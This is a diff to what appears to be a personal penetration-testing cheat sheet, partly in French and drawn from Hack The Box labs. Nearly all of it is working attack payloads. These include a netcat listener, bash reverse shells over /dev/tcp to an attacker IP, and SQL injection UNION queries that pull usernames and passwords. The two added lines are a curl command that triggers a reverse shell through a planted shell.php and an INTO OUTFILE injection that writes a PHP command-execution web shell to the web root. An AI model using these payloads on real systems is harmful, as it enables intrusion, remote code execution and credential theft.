@@ -151,6 +151,7 @@ nc -nlvp 443
 # from HTB
 nc -nlvp 443
 bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+curl {VICTIME_IP}/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/{your_IP}/1234 0>&1"'
 
 
 # passer en bash
@@ -206,6 +207,9 @@ http://target.com/login.php?id=1' OR '1'='1 --
 ' UNION SELECT username, NULL FROM users LIMIT 1 OFFSET 0 --
 ' UNION SELECT password, NULL FROM users LIMIT 1 OFFSET 1 --
 ' UNION SELECT username, NULL FROM users LIMIT 1 OFFSET 2 --
+
+
+Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
 ```
 
 - Crack de hash / bruteforce password local
